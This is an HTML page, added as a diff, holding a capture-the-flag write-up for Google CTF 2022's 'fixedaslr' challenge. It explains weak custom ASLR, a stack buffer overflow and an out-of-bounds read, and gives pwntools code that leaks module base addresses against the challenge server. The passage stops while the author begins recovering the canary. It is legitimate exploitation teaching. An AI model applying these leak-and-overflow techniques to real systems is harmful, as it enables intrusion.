@@ -1,0 +1,742 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="theme-color" content="#2ecc71">
+
+
+
+
+
+<title>Google Capture The Flag 2022 - fixedaslr | kileak</title>
+
+
+
+
+
+<meta name="description" content="Google Capture The Flag 2022 - fixedaslr">
+
+
+<meta name="keywords" content="google, fixedaslr">
+
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+
+
+
+
+
+
+<link rel="canonical" href="https://kileak.github.io/ctf/2022/googlectf22-fixedaslr/">
+<link rel="alternate" type="application/rss+xml" title="kileak" href="https://kileak.github.io/feed.xml" />
+
+
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4PGFKKP0QW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4PGFKKP0QW');
+</script>
+
+
+<script>base_url = "";</script>
+
+  </head>
+  <body class="">
+
+    <main class="main-container">
+
+        <header class="site-header">
+
+  <div class="container txt-center">
+    <a href="#" class="nav-toogle js-menu-trigger sliding-panel-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </a>
+
+    <nav class="js-menu sliding-panel-content">
+      <ul>
+        <li><a href="/">home</a></li>
+        <li><a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank">youtube</a></li>
+        <li><a href="/feed.xml" target="_blank"><i class="icon icon-feed"></i> feed</a></li>
+      </ul>
+    </nav>
+    <div class="js-menu-screen sliding-panel-fade-screen"></div>
+
+    <a href="/" class="author-thumb dot">
+      <img src="/images/author.jpg" alt="Author thumbnail" class="dot">
+    </a>
+
+    <!--
+    <a href="https://www.youtube.com/channel/UCi-IXmtQLrJjg5Ji78DqvAg/videos" target="_blank" class="youtube-thumb dot">
+      <img src="/images/youtube-icon.png" alt="Youtube" class "dot">
+    </a>
+    -->
+
+    
+      <h1 class="post-title">Google Capture The Flag 2022 - fixedaslr</h1>
+      <p class="post-meta">Jul 3, 2022</p>
+    
+
+  </div>
+
+</header>
+
+
+        <section class="main-content">
+          <article class="post">
+
+  <div class="post-content container">
+    <blockquote>
+  <p>Google Capture The Flag 2022 - fixedaslr
+<!--break--></p>
+
+  <p>I wasn’t happy with the default ASLR, so I fixed it. The flag is in a file called “flag” both in / and cwd.</p>
+
+  <p>fixedaslr.2022.ctfcompetition.com 1337</p>
+
+  <p>Attachment: <a href="https://kileak.github.io/assets/google2022/fixedaslr/fixedaslr.zip">fixedaslr.zip</a> <a href="https://kileak.github.io/assets/google2022/fixedaslr/xpl.py">xpl.py</a></p>
+
+  <p>Team: Super Guesser</p>
+</blockquote>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">   ______      Welcome to the
+  / ____/___ _____ ___  ___ 
+ / / __/ __ `/ __ `__ \/ _ \
+/ /_/ / /_/ / / / / / /  __/
+\____/\__,_/_/ /_/ /_/\___/ 
+
+
+-=*) MAIN MENU:
+  1) Play The Game
+  2) See full scoreboard
+  3) See score for place
+  4) Exit
+Your choice?</code></pre></figure>
+
+<p>So this “game” consisted of a <code class="language-plaintext highlighter-rouge">loader</code> and several <code class="language-plaintext highlighter-rouge">object</code> files, which were dynamically loaded at startup and <code class="language-plaintext highlighter-rouge">mmapped</code> with a custom <code class="language-plaintext highlighter-rouge">aslr</code> functionality.</p>
+
+<p>At startup, it fetches a <code class="language-plaintext highlighter-rouge">random state</code> from <code class="language-plaintext highlighter-rouge">urandom</code>, initializes a <code class="language-plaintext highlighter-rouge">stack guard</code> canary and then loads the provided object files and maps them to “randomized” memory regions.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">start</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">sys_getrandom</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rand_state</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+
+  <span class="n">init_stack_guard</span><span class="p">();</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">load_o_phase_1</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">o_ctx</span> <span class="o">+</span> <span class="mi">616</span> <span class="o">*</span> <span class="n">i</span><span class="p">,</span> <span class="n">files</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+
+  <span class="p">...</span>
+
+  <span class="n">rand_state</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">pivot_to_main</span><span class="p">(</span><span class="n">main_addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">init_stack_guard</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+
+  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">canary</span> <span class="o">=</span> <span class="n">rand</span><span class="p">(</span><span class="mi">64</span><span class="p">);</span>
+
+  <span class="n">write_stack_guard</span><span class="p">(</span><span class="n">canary</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">aslr_get_addr</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="p">...</span>
+
+  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">test_addr</span> <span class="o">=</span> <span class="n">rand</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">28</span><span class="p">;</span>
+
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">sys_mmap</span><span class="p">(</span><span class="n">test_addr</span><span class="p">,</span> <span class="n">v4</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1048610</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="p">(</span> <span class="n">addr</span> <span class="o">&lt;=</span> <span class="mh">0xFFFFFFFFFFFFEFFF</span> <span class="p">)</span>
+      <span class="k">break</span><span class="p">;</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"note: candidate address occupied"</span><span class="p">);</span>
+  <span class="p">}</span>
+  
+  <span class="p">...</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>In <code class="language-plaintext highlighter-rouge">aslr_get_addr</code> we can see, that it will effectly only randomize 12 bits and shifts them resulting in memory regions like this:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x00000005f0000000 0x00000005f0002000 0x0000000000000000 r-x 
+0x00000005f0002000 0x00000005f0003000 0x0000000000000000 rw- 
+0x00000005f0003000 0x00000005f0005000 0x0000000000000000 r-- 
+0x0000004ad0000000 0x0000004ad0001000 0x0000000000000000 r-x 
+0x0000004ad0001000 0x0000004ad0003000 0x0000000000000000 r-- 
+0x0000006950000000 0x0000006950002000 0x0000000000000000 r-x 
+0x0000006950002000 0x0000006950003000 0x0000000000000000 r-- 
+0x00000087b0000000 0x00000087b0002000 0x0000000000000000 r-x 
+0x00000087b0002000 0x00000087b0004000 0x0000000000000000 rw- 
+0x00000087b0004000 0x00000087b0005000 0x0000000000000000 r-- 
+0x000000e010000000 0x000000e010002000 0x0000000000000000 r-x 
+0x000000e010002000 0x000000e010004000 0x0000000000000000 r-- 
+0x000000ead0000000 0x000000ead0002000 0x0000000000000000 r-x 
+0x000000ead0002000 0x000000ead0004000 0x0000000000000000 r-- 
+0x000000f520000000 0x000000f520002000 0x0000000000000000 r-x 
+0x000000f520002000 0x000000f520003000 0x0000000000000000 r-- 
+0x00007f2005b14000 0x00007f2005b15000 0x0000000000000000 r-x =&gt; loader
+0x00007f2005b15000 0x00007f2005b16000 0x0000000000000000 rw- 
+0x00007ffd38666000 0x00007ffd38687000 0x0000000000000000 rw- [stack]
+0x00007ffd38691000 0x00007ffd38695000 0x0000000000000000 r-- [vvar]
+0x00007ffd38695000 0x00007ffd38697000 0x0000000000000000 r-x [vdso]
+0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]</code></pre></figure>
+
+<p>The functionality needed for the challenge is separated in different object files</p>
+
+<ul>
+  <li>basic.o     - Provides basic functionality like <code class="language-plaintext highlighter-rouge">strcmp</code>, <code class="language-plaintext highlighter-rouge">strcpy</code></li>
+  <li>syscalls.o  - Provides access to syscall interface and provide simple syscalls like <code class="language-plaintext highlighter-rouge">write</code>, <code class="language-plaintext highlighter-rouge">read</code>, …</li>
+  <li>guard.o     - Provides simple <code class="language-plaintext highlighter-rouge">_stack_chk_fail</code> handler</li>
+  <li>res.o       - Resource file (containing game banner)</li>
+  <li>debug.o     - Just contains all the nice gadget, you’d need for ropchains</li>
+  <li>main.o      - Entry point, show banner and enter game</li>
+  <li>game.o      - Contains all the game logic</li>
+</ul>
+
+<p>To get started, let’s check the game logic, since this is our main interface to the challenge.</p>
+
+<p>We don’t have too many options in the game</p>
+
+<ul>
+  <li>Play the game</li>
+  <li>See full scoreboard</li>
+  <li>See score for place</li>
+</ul>
+
+<p>Checking the full scoreboard isn’t too useful, since it will just show the existing scores and doesn’t seem to be vulnerable.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Play the game</code> will always create two random numbers and asks for the result when adding those two values. Nothing too interesting here.</p>
+
+<p>But if we win the game and have a score, which would let us enter the scoreboard, a simple buffer overflow waits for us.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">check_scoreboard</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">score</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">9</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">score</span> <span class="o">&gt;</span> <span class="n">game_scoreboard</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">shift_scoreboard</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+      <span class="n">get_player_name</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
+      <span class="n">game_scoreboard</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">score</span><span class="p">;</span>      
+    <span class="p">}</span>
+  <span class="p">}</span>  
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">get_player_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> 
+  
+  <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
+  
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Congratulations! You're going to the SCOREBOARD!"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"How long is your name (0-31)?"</span><span class="p">);</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="n">readline</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">size</span> <span class="o">=</span> <span class="n">atou64</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x1F</span> <span class="p">)</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"Name too long! No SCOREBOARD for you."</span><span class="p">);</span>
+
+    <span class="n">puts</span><span class="p">(</span><span class="s">"Now type in your name:"</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+    <span class="n">buf</span><span class="p">[</span><span class="mi">31</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">game_names</span> <span class="o">+</span> <span class="mi">32</span> <span class="o">*</span> <span class="n">idx</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+  <span class="p">}</span>  
+<span class="p">}</span></code></pre></figure>
+
+<p>Though it seems to check for a valid size, it doesn’t return and thus only prints an error message but happily continues reading into <code class="language-plaintext highlighter-rouge">buf</code> resulting in an overflow. But the function is guarded with a canary, so just overflowing it, will get us nowhere without knowing the correct canary.</p>
+
+<p>Let’s put that aside and try to find some leaks first.</p>
+
+<p>The option <code class="language-plaintext highlighter-rouge">See score for place</code> gives us a somewhat arbitrary read, since it doesn’t do proper boundary checks.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">see_scoreboard</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">idx</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">input</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> 
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
+  
+  <span class="n">puts</span><span class="p">(</span><span class="s">"Which place's score do you want to see (0-9)?"</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">readline</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">idx</span> <span class="o">=</span> <span class="n">atou64</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+
+    <span class="n">print</span><span class="p">(</span><span class="s">"To get this place you need to beat this score: "</span><span class="p">);</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>    
+    <span class="n">u64toa</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">game_scoreboard</span><span class="p">[</span><span class="n">idx</span><span class="p">]);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>With this, we can now read any <code class="language-plaintext highlighter-rouge">qword</code> relative to the start of the scoreboard.</p>
+
+<p>By now, we don’t know any address, since all object file regions are randomized, but using this, we can search for addresses in the region, the <code class="language-plaintext highlighter-rouge">game_scoreboard</code> is located in.</p>
+
+<p>At first, I only searched for leaks and stored them randomly. But it later turned out, that it would be a good idea to know exactly to which object file which address belongs to, so lets do it right this time from the beginning.</p>
+
+<p><code class="language-plaintext highlighter-rouge">game_scoreboard</code> is a reference to <code class="language-plaintext highlighter-rouge">scoreboard</code> in <code class="language-plaintext highlighter-rouge">main.o</code>, so the scoreboard itself is stored in the data region of <code class="language-plaintext highlighter-rouge">main</code>.</p>
+
+<p>Let’s see, if we can find something useful behind the scoreboard</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x00000087b0002000
+0x87b0002000:	0x000000000000005f	0x000000000000005a  &lt;= scoreboard (main.o)
+0x87b0002010:	0x0000000000000055	0x0000000000000050
+0x87b0002020:	0x000000000000004b	0x0000000000000046
+0x87b0002030:	0x0000000000000041	0x000000000000003c
+0x87b0002040:	0x0000000000000037	0x0000000000000032
+0x87b0002050:	0x0000000000000000	0x0000000000000000
+0x87b0002060:	0x0000000079726147	0x0000000000000000  &lt;= names
+0x87b0002070:	0x0000000000000000	0x0000000000000000
+0x87b0002080:	0x000000006c656f59	0x0000000000000000
+0x87b0002090:	0x0000000000000000	0x0000000000000000
+0x87b00020a0:	0x73616c6f6863694e	0x0000000000000000
+0x87b00020b0:	0x0000000000000000	0x0000000000000000
+0x87b00020c0:	0x00617373656e6156	0x0000000000000000
+0x87b00020d0:	0x0000000000000000	0x0000000000000000
+0x87b00020e0:	0x0000006563696c41	0x0000000000000000
+...
+0x87b0002ff0:	0x0000000000000000	0x0000000000000000
+0x87b0003000:	0x00000087b0002060	0x0000000000000000 &lt;= ref to names
+0x87b0003010:	0x0000000000000000	0x0000000000000000
+...</code></pre></figure>
+
+<p>So, we have a reference to <code class="language-plaintext highlighter-rouge">names</code> at offset <code class="language-plaintext highlighter-rouge">0x1000</code> from the scoreboard, which we can read and thus know the base address of <code class="language-plaintext highlighter-rouge">main</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"fixedaslr.2022.ctfcompetition.com"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">PROCESS</span> <span class="o">=</span> <span class="s">"./loader"</span>
+
+<span class="k">def</span> <span class="nf">read_off</span><span class="p">(</span><span class="n">off</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">off</span><span class="p">))</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"score: "</span><span class="p">)</span>
+  <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">LEAK</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+  <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"choice?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+
+  <span class="n">LEAKMAIN</span> <span class="o">=</span> <span class="n">read_off</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">//</span><span class="mi">8</span><span class="p">)</span>
+  <span class="n">MAINRW</span> <span class="o">=</span> <span class="n">LEAKMAIN</span> <span class="o">-</span> <span class="mh">0x60</span>
+  <span class="n">MAINRX</span> <span class="o">=</span> <span class="n">MAINRW</span> <span class="o">-</span> <span class="mh">0x2000</span>
+	
+  <span class="k">print</span><span class="p">(</span><span class="s">"main     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">MAINRX</span><span class="p">))</span>
+	
+  <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+	
+  <span class="k">return</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+  <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>		
+  <span class="k">else</span><span class="p">:</span>
+    <span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./loader"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="p">(</span><span class="n">util</span><span class="p">.</span><span class="n">proc</span><span class="p">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
+    <span class="n">pause</span><span class="p">()</span>
+	
+  <span class="n">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">)</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Starting local process './loader': pid 114062
+[114062]
+[*] Paused (press any to continue)
+main     : 0x3690000000
+[*] Switching to interactive mode</code></pre></figure>
+
+<p>Since <code class="language-plaintext highlighter-rouge">main.o</code> is calling the <code class="language-plaintext highlighter-rouge">show_banner</code> function from <code class="language-plaintext highlighter-rouge">game.o</code> at startup, it needs to know its address and we can find it at the start of <code class="language-plaintext highlighter-rouge">main</code> region.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x3690000000
+0x3690000000:	0xcccc0000000225ff	0x0000008ea0001111 &lt;= x / show_banner
+0x3690000010:	0xcccc0000000225ff	0x0000008ea000175c
+0x3690000020:	0xcccc0000000225ff	0x0000008ea0001000
+0x3690000030:	0xcccc0000000225ff	0x0000002bf0001000
+0x3690000040:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>By reading that, we can derive the base address of <code class="language-plaintext highlighter-rouge">game.o</code>. But since we now want to read a value, which is located “before” the scoreboard and we cannot enter negative values, we have to pass such a big index, that it will overflow and thus “wrap” around at <code class="language-plaintext highlighter-rouge">0xffffffffffffffff</code></p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">get_off</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">target</span><span class="p">):</span>
+  <span class="k">if</span> <span class="n">target</span> <span class="o">&gt;</span> <span class="n">base</span><span class="p">:</span>
+    <span class="k">return</span> <span class="n">target</span><span class="o">-</span><span class="n">base</span>
+  <span class="k">else</span><span class="p">:</span>
+    <span class="k">return</span> <span class="mh">0x10000000000000000</span><span class="o">-</span><span class="p">(</span><span class="n">base</span><span class="o">-</span><span class="n">target</span><span class="p">)</span><span class="o">//</span><span class="mi">8</span>
+
+<span class="p">...</span>
+
+<span class="n">GAMELEAK</span> <span class="o">=</span> <span class="n">read_off</span><span class="p">(</span><span class="n">get_off</span><span class="p">(</span><span class="n">MAINRW</span><span class="p">,</span> <span class="n">MAINRX</span><span class="o">+</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">GAMERX</span> <span class="o">=</span> <span class="n">GAMELEAK</span> <span class="o">-</span> <span class="mh">0x1111</span>
+<span class="n">GAMERW</span> <span class="o">=</span> <span class="n">GAMERX</span> <span class="o">+</span> <span class="mh">0x2000</span>
+	
+<span class="k">print</span><span class="p">(</span><span class="s">"game     : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">GAMERX</span><span class="p">))</span></code></pre></figure>
+
+<p>Since we now know the base address of <code class="language-plaintext highlighter-rouge">game.o</code> we can also start leaking addresses from there, since we can exactly calculate the needed offset from <code class="language-plaintext highlighter-rouge">scoreboard</code> to <code class="language-plaintext highlighter-rouge">game</code> now.</p>
+
+<p><code class="language-plaintext highlighter-rouge">game.o</code> will contain a reference to <code class="language-plaintext highlighter-rouge">print</code> from <code class="language-plaintext highlighter-rouge">basic.o</code> and <code class="language-plaintext highlighter-rouge">_stack_chk_fail</code> from <code class="language-plaintext highlighter-rouge">guard.o</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x0000008ea0000000
+0x8ea0000000:	0xcccc0000000225ff	0x0000007cd000119c =&gt; x / basic.o print
+0x8ea0000010:	0xcccc0000000225ff	0x0000007cd00011f2
+0x8ea0000020:	0xcccc0000000225ff	0x0000002bf0001000 =&gt; x / guard.o _stack_chk_fail</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">BASICLEAK</span> <span class="o">=</span> <span class="n">read_off</span><span class="p">(</span><span class="n">get_off</span><span class="p">(</span><span class="n">MAINRW</span><span class="p">,</span> <span class="n">GAMERX</span><span class="o">+</span><span class="mi">8</span><span class="p">))</span>
+<span class="n">BASICRX</span> <span class="o">=</span> <span class="n">BASICLEAK</span> <span class="o">-</span> <span class="mh">0x119c</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"basic    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">BASICRX</span><span class="p">))</span>
+
+<span class="n">GUARDLEAK</span> <span class="o">=</span> <span class="n">read_off</span><span class="p">(</span><span class="n">get_off</span><span class="p">(</span><span class="n">MAINRW</span><span class="p">,</span> <span class="n">GAMERX</span><span class="o">+</span><span class="mh">0x28</span><span class="p">))</span>
+<span class="n">GUARDRX</span> <span class="o">=</span> <span class="n">GUARDLEAK</span> <span class="o">-</span> <span class="mh">0x1000</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"guard    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">GUARDRX</span><span class="p">))</span></code></pre></figure>
+
+<p>We can also find a reference in <code class="language-plaintext highlighter-rouge">game.o</code> to <code class="language-plaintext highlighter-rouge">game_banner</code>, which comes from <code class="language-plaintext highlighter-rouge">res.o</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x0000008ea0002000
+0x8ea0002000:	0x0000008750001000	0x0000003690002000 =&gt; game_banner / game_scoreboard
+0x8ea0002010:	0x0000003690002060	0x0000000000000000 =&gt; game_names
+0x8ea0002020:	0x0000000000000000	0x0000000000000000
+0x8ea0002030:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">RESLEAK</span> <span class="o">=</span> <span class="n">read_off</span><span class="p">(</span><span class="n">get_off</span><span class="p">(</span><span class="n">MAINRW</span><span class="p">,</span> <span class="n">GAMERW</span><span class="p">))</span>
+<span class="n">RESBASE</span> <span class="o">=</span> <span class="n">RESLEAK</span> <span class="o">-</span> <span class="mh">0x1000</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"res      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">RESBASE</span><span class="p">))</span>	</code></pre></figure>
+
+<p>In <code class="language-plaintext highlighter-rouge">basic.o</code> we can find a reference to <code class="language-plaintext highlighter-rouge">sys_read</code> at offset <code class="language-plaintext highlighter-rouge">0x28</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x0000007cd0000000
+0x7cd0000000:	0xcccc0000000225ff	0x0000002bf0001000
+0x7cd0000010:	0xcccc0000000225ff	0x0000002bf0001000
+0x7cd0000020:	0xcccc0000000225ff	0x0000002bf0001000
+0x7cd0000030:	0xcccc0000000225ff	0x00000063a00010ba =&gt; syscalls.o / sys_read
+0x7cd0000040:	0xcccc0000000225ff	0x0000002bf0001000</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">SYSCALLSLEAK</span> <span class="o">=</span> <span class="n">read_off</span><span class="p">(</span><span class="n">get_off</span><span class="p">(</span><span class="n">MAINRW</span><span class="p">,</span> <span class="n">BASICRX</span><span class="o">+</span><span class="mh">0x38</span><span class="p">))</span>
+<span class="n">SYSCALLSRX</span> <span class="o">=</span> <span class="n">SYSCALLSLEAK</span> <span class="o">-</span> <span class="mh">0x10ba</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"syscalls : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSCALLSRX</span><span class="p">))</span></code></pre></figure>
+
+<p>With this, we now have found all discoverable leaks (<code class="language-plaintext highlighter-rouge">debug.o</code> cannot be found, since none of the other object files reference it)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Starting local process './loader': pid 116330
+[116330]
+[*] Paused (press any to continue)
+main     : 0x78b0000000
+game     : 0x59d0000000
+basic    : 0x3330000000
+guard    : 0x3b10000000
+res      : 0xfb70000000
+syscalls : 0xc320000000</code></pre></figure>
+
+<p>Still, we don’t know the <code class="language-plaintext highlighter-rouge">canary</code> to exploit the buffer overflow in the enter score function.</p>
+
+<p>But checking the randomize functionality from the challenge again, it seemed to be quite possible to reverse it, to get the inital <code class="language-plaintext highlighter-rouge">random_state</code> to be able to calculate the canary ourself.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">loader</code> initially fills <code class="language-plaintext highlighter-rouge">rand_state</code> by reading it from <code class="language-plaintext highlighter-rouge">urandom</code> and then initializes the stack guard with <code class="language-plaintext highlighter-rouge">rand(64)</code>.</p>
+
